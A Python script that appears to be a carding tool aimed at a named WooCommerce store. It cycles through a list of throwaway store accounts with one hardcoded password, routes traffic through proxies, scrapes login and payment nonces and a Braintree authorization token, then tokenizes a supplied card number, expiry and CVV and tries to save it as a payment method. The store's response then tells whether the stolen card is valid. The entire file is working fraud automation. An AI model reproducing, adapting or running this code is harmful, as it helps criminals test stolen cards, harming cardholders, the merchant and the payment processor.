import requests,base64,secrets,re,uuid,random,json
from bs4 import BeautifulSoup
from httpx import AsyncClient
from proxy import proxies
def getstr( data, first, last ):
    try: 
        start = data.index( first ) + len( first ) 
        end = data.index( last, start ) 
        return data[start:end] 
    except ValueError: 
        return None

current_index = 0
def login_user():
    global current_index
    users = ['xftvgu', 'bonabe1933','yehakin797','dojide3139','hedig55868',
             'viret67523','pahepad741','sekera1881','fikaje5559','yoxeyet207',
             'dgkiufb','ygfyi78','ayan1','ayan2','ayan3','ayan4','ayan5','ayan6',
             'ayan7','ayan8','ayan9','ayan10','ayan11','ayan12','ayan13','ayan14','ayan15']
    
    username = users[current_index]
    
    current_index = (current_index + 1) % len(users)
    
    return username


async def B3_Auth4(cc,mm, yy, cvv):
    user = login_user()
    proxy = proxies()
    r = requests.session()
    r.proxies = proxy
    correlationid = secrets.token_hex(16)
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.intoxicatedonlife.com/store/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    response =  r.get('https://www.intoxicatedonlife.com/store/my-account/', headers=headers,)
    try:
            login = getstr(response.text, 'woocommerce-login-nonce" value="', '"')
    except:
            return 'Error: Failed to retrieve login nonce'
        
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.intoxicatedonlife.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.intoxicatedonlife.com/store/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
        'username': user,
        'password': 'Ayanpro@087',
        'woocommerce-login-nonce': login,
        '_wp_http_referer': '/store/my-account/',
        'login': 'Log in'
        }

    response =  r.post('https://www.intoxicatedonlife.com/store/my-account/', headers=headers, data=data, )

    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.intoxicatedonlife.com/store/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    response =  r.get('https://www.intoxicatedonlife.com/store/my-account/payment-methods/', headers=headers, )
    try:
        client_token_nonce = re.findall(r'"client_token_nonce":\s*"([a-zA-Z0-9]+)"', response.text)[0]
    except:
            return 'Error: Failed to retrieve client nonce'
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.intoxicatedonlife.com/store/my-account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    response =  r.get('https://www.intoxicatedonlife.com/store/my-account/add-payment-method/', headers=headers, )
    try:
            payment_nonce = getstr(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
    except:
            return 'Error: Failed to retrieve payment nonce'
    headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.intoxicatedonlife.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.intoxicatedonlife.com/store/my-account/add-payment-method/',

            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_token_nonce
        }
    response =  r.post('https://www.intoxicatedonlife.com/store/wp-admin/admin-ajax.php', headers=headers, data=data, ).json()
    try:
            decode = base64.b64decode(response['data']).decode('utf-8')
            at = getstr(decode, '"authorizationFingerprint":"', '"')
    except:
            return 'Error: Failed to retrieve authorization token'
    headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {at}',
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

    response =  r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, )
    try:
            token = response.json()['data']['tokenizeCreditCard']['token']
    except:
            return 'Error: Tokenization failed'
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.intoxicatedonlife.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.intoxicatedonlife.com/store/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'visa',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '{"correlation_id":"'+correlationid+'"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': payment_nonce,
        '_wp_http_referer': '/store/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1'
        }

    response =  r.post('https://www.intoxicatedonlife.com/store/my-account/add-payment-method/', headers=headers, data=data,)
    soup = BeautifulSoup(response.text, 'html.parser')
    error_message = soup.find('ul', class_='woocommerce-error')
    success_message = soup.find('div', class_='woocommerce-message')
    try:
            if error_message:
                error_text = error_message.get_text(strip=True)
                formatted_error = re.sub(r'Status code\s+', '', error_text)
                if formatted_error:
                    return formatted_error
            if success_message:
                success_text = success_message.get_text(strip=True)
                return success_text 
            else:
                return 'Unknown error'
    except:
            return 'Error: Failed to parse response'
